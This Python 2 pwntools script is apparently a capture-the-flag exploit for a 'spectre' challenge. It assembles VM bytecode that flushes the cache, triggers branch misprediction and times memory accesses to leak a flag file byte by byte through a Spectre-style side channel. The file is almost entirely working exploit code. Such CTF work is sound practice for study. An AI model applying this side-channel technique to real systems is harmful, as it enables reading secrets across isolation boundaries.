#!/usr/bin/env python2
# -*- coding: utf-8 -*-

#from yeonnic import *
from pwn import *

context.arch="amd64"
elf = ELF("/home/zbvs/curctf/spectre/spectre")


#gdb_pie_attach(p, [0xb02, 0xF96, 0xf16], "tracemalloc on\n")


REG = {}
REG['rdi'] = 0
REG['rsi'] = 1

PRINT_ASM = True
#PRINT_ASM = False
tt = ""
def print_disasm (asm):
    global tt
    return 0
    if PRINT_ASM is False:
        tt += asm
        return
    print disasm (asm, os='linux', arch='amd64')

def cdq (reg):
    gadget = "\x4d\x63"+chr(0xc0|(reg&7)*8 | (reg>>3)&7) #movsxd r8~r15,r8d
    print_disasm (gadget)
    ac = "\x01" + chr(reg)
    return ac

def add (reg):
    gadget = "\x4d\x01"+chr(0xc0|reg)#add    (r8~15),(r8~r15)
    print_disasm (gadget)
    ac = "\x02" + chr(reg)
    return ac

def sub (reg):
    gadget = "\x4d\x29"+chr(0xc0|reg)#sub    reg,reg
    print_disasm (gadget)
    ac = "\x03" + chr(reg)
    return ac

def andd (reg):
    gadget = "\x4d\x21"+chr(0xc0|reg)#and    reg,reg
    print_disasm (gadget)
    ac = "\x04" + chr(reg)
    return ac

def shl (reg):
    gadget = "\x44\x88"+chr(0xc1|reg&0x38)#mov    (cl~,r8b~)
    gadget += "\x49\xd3" + chr (reg&7 | 0xe0)#shl    r8,cl
    print_disasm (gadget)#
    ac = "\x05" + chr(reg)
    return ac

def shr (reg):
    gadget = "\x44\x88"+chr(0xc1|reg&0x38) +"\x49\xd3" + chr (reg&7 | 0xe8)
    print_disasm (gadget)
    ac = "\x06" + chr(reg)
    return ac

def mov (reg):
    gadget = "\x4d\x89"+chr(0xc0|reg) #mov    (r8~r15),(r8~r15)
    print_disasm (gadget)
    ac = "\x07" + chr(reg)
    return ac

def movc (reg, c):
    rr = reg&7
    if rr >0xf :
        rr -= 0x10
        gadget = "\x48\xc7" + chr(rr|0xc0) + p32(c)#mov rax-rdi, c
    else :
        gadget = "\x49\xc7" + chr(rr|0xc0) + p32(c)#mov r8-r15, c

        print_disasm (gadget)
        ac = "\x08" + chr(reg) + p32(c)
        return ac

def load (reg):
    rr = (reg>>3) & 7
    if (rr > 8):
        sys.exit ("load reg error")
    gadget = "\x44\x89" +  chr ((rr * 8) | 0xc0)#mov    eax, (r8d ~ r15d)
    gadget += "\x4c\x8b" + chr(8*(reg&7)+4) + "\x07" #move r8~r15,QWORD PTR [rdi+rax*1]
    print_disasm (gadget)
    ac = "\x09" + chr(reg)
    return ac


def store (reg):
    rr = (reg) & 7
    if (rr > 8):
        sys.exit ("store reg error")
    gadget = "\x44\x89" +  chr ((rr * 8) | 0xc0) #mov    eax,(r8d ~ r15d)
    gadget += "\x4c\x89" + chr((reg&0x38)|4) + "\x07" #mov    QWORD PTR [rdi+rax*1],(r8-r15)

    print_disasm (gadget)
    ac = "\x0a" + chr(reg)
    return ac

def builtin (reg):
    rr = ((reg>>3) & 7)
    if (rr > 1):
        sys.exit ("builtin reg error")
    gadget = "\x57\x56"
    for i in xrange (4):
        gadget += "\x41" + chr (i | 0x50)
    gadget += "8944CE8944C78944".decode('hex')[::-1]
    gadget += "D98944D2".decode('hex')[::-1]
    gadget += "\xff\x55"
    gadget += chr(rr*8)
    for i in xrange (3, -1, -1):
        gadget += "\x41" + chr (i | 0x58)
    gadget += "89495f5e".decode('hex')[::-1]
    gadget +=  chr(reg|0xc0)

    print_disasm (gadget)
    ac = "\x0b" + chr(reg) #or     eax,DWORD PTR [rcx]
    return ac

def loop (reg, c, _code):
    rr = ((reg>>3) & 7)

    cc = c
    if (c < 0):
        cc = 0x100000000 + c

    code = _code
    if (_code < 0):
        code = 0x100000000 + _code

    gadget = "\x48\xc7" + chr(0xc0) + p32(cc) #mov    rax,0x cc
    gadget += "\x49\x39" + chr (rr | 0xc0)#cmp    (r8-r15),rax
    gadget += "\x0f\x8e" 
    gadget += p32 (0x100000000-0x10 - _code) # jle code 
    
    print_disasm (gadget)
    ac = "\x0c" + chr(reg) + p32(cc) + p32 (code)
    return ac
SRC = {}
SRC['r8'] = 0 << 3
SRC['r9'] = 1 << 3
SRC['r10'] = 2 << 3
SRC['r11'] = 3 << 3
SRC['r12'] = 4 << 3
SRC['r13'] = 5 << 3
SRC['r14'] = 6 << 3
SRC['r15'] = 7 << 3

DST = {}
DST['r8'] = 0
DST['r9'] = 1
DST['r10'] = 2
DST['r11'] = 3
DST['r12'] = 4
DST['r13'] = 5
DST['r14'] = 6
DST['r15'] = 7

#char*target_size
target_size = 0x1000 #need page align size  
cursize = target_size
offset = 0
while 1:
    cursize = cursize >> 1
    offset = offset + 1
    if cursize == 1:
        break

pay = ""

flush_size = 0x100

# flush cache
# store value to all test area, (make cache dirty?)
# this will move area to L2?L3? cache,

if True:
    pay += movc (DST['r10'], 0x000000)
    jmp_target1 = len(pay)
    pay += movc (0, 0x0) 
    pay += store (DST['r10'] | SRC['r8'])
    #pay += load (DST['r8'] | SRC['r10'])
    pay += movc (0, target_size)
    pay += add (DST['r10'] | SRC['r8'])
    pay += loop (SRC['r10'], (target_size*0x100) , jmp_target1) # cmp r11, iter_max



#evict test area
reverse_flush = True

if reverse_flush == True:
    #buffer_size = 0x2000000
    pay += movc (DST['r11'], 0)
    pay += movc (DST['r10'], target_size*0x100)
    #############################################3
    jmp_target2 = len(pay)
    pay += movc (DST['r12'], (0x2000000+target_size*0x100) - 10 )
    pay += movc (0, 0x0)
    pay += sub (DST['r12'] | SRC['r10'])#2100000 - r10*0x1000
    #pay += store (DST['r12'] | SRC['r8'])
    pay += load (DST['r8'] | SRC['r12'])
    pay += movc (DST['r8'], flush_size)
    pay += add (DST['r10'] | SRC['r8'])
    pay += movc (DST['r8'], 1)
    pay += add (DST['r11'] | SRC['r8'])
    pay += loop (SRC['r11'], 0x1f00000 / flush_size - 1, jmp_target2) # cmp r11, iter_max

else:
    #buffer_size = 0x2000000
    pay += movc (DST['r11'], 0)
    pay += movc (DST['r10'], target_size*0x100)
    #############################################3
    jmp_target2 = len(pay)
    pay += movc (DST['r12'],  10 )
    pay += movc (0, 0x0)
    pay += add (DST['r12'] | SRC['r10'])#2100000 - r10*0x1000
    pay += load (SRC['r12'])
    pay += movc (DST['r8'], flush_size)
    pay += add (DST['r10'] | SRC['r8'])
    pay += movc (DST['r8'], 1)
    pay += add (DST['r11'] | SRC['r8'])
    pay += loop (SRC['r11'], 0x1f00000 / flush_size - 1, jmp_target2) # cmp r11, iter_max
    

##### miss prediction access
target_offset = 0x1020
pay += movc (DST['r11'] , 8*7) # move r9, 9
pay += movc (DST['r12'] , 8*7 - offset) # move r10, 8*4 - 1
pay += movc (DST['r8'] , target_offset) # move r8, 0
pay += builtin (DST['r14'] | 0) # return to r14
pay += shl(DST['r14'] | SRC['r11'])#(regnum<<3)    shl r14, r9
pay += shr(DST['r14'] | SRC['r12'])#shr r14, r10
pay += load(DST['r8'] | SRC['r14']) # mov eax, r14d,  mov r8, [rdi+ rax]

################################
# time attack
##############################
mix_order = 0
if True:
    pay += movc (DST['r11'], 0) #cnt  r11 
    pay += movc (DST['r12'], 0)#offset r12 
    if mix_order == 1:#user mixorder
        pay += movc(DST['r8'],13)#mov r8, 13
        pay += add(DST['r12'] | SRC['r8'])#add r12, 13

    jmp_targetF = len(pay)
    if mix_order == 1:#r12 <- mix_i
        #167*i+13
        pay += movc(DST['r8'], 167)
        pay += add(DST['r12'] | SRC['r8'])
        pay += movc(DST['r8'], 0xff)
        pay += andd(DST['r12'] | SRC['r8'])
    elif mix_order == 2:#use reverse order   # r12 <- reverse_i
        pay += movc(DST['r8'], 0xff)
        pay += sub(DST['r8'] | SRC['r11'])
        pay += mov(DST['r12'] | SRC['r8'])
    else:#use normal
        pay += mov(DST['r12'] | SRC['r11'])
    
    pay += mov(DST['r8'] | SRC['r12'])#mov r8, r12
    #idx << offset
    pay += movc(DST['r9'], offset)#mov r9, 9
    pay += shl(DST['r8'] | SRC['r9'])#shl r8, r9

    pay += builtin (9) # return to r9
    pay += load(DST['r8'] | SRC['r8']) # mov eax, r8d,  mov r8, [rdi+ rax]
    pay += builtin (8) # return to r8
    pay += sub (DST['r8'] | SRC['r9'])#sub r8,r9
    pay += mov(DST['r13'] | SRC['r8'])#mov r13, r8
    
    #if mix_order == False:
        #move r8 <- reverse_i
    #else:
        #move r8 <- mix_i
    pay += mov(DST['r8'] | SRC['r12'])#mov r8, r12
    pay += movc(DST['r9'], 3)#mov r9, 3
    pay += shl(DST['r8'] | SRC['r9'])# shl r8, r9  (mix_i*8)
    pay += store(DST['r8'] | SRC['r13'])#mov eax, r8   ,   mov [rdi+rax], rdtsc_gap
    pay += movc(DST['r8'], 1)#mov r8 ,1
    pay += add(DST['r11'] | SRC['r8'])#add r11,r8 
    pay += loop (SRC['r11'], 0xff, jmp_targetF) # cmp r11, iter_max

pay += movc (0, 0x41414141)
print "rlength:",  (hex(len(pay)))
pay = pay.ljust (0x1000, "\x00")

with open ("bytecode", "wb") as f:
    f.write (p64(len(pay)) + pay + "\n")

arr = []
for i in range(0, 0x100):
    arr.append(0)

trycnt = 0x20
th = 0x80
for i in range(0, trycnt):
    r = process(["/home/zbvs/curctf/spectre/spectre", "/home/zbvs/curctf/spectre/flag"])
    r.send (p64(len(pay)))
    print "length:",  (hex(len(pay)))
    r.sendline (pay)
    
    for j in range (0x00, 0xff):
        data = u64(r.recv(8))
        #print('0x%x: 0x%x' % (j,data))
        if data < th:
            arr[j] += 1
    r.close()

for i in range(0x20, 0x80):
    print('%c: 0x%x' % (i,arr[i]))
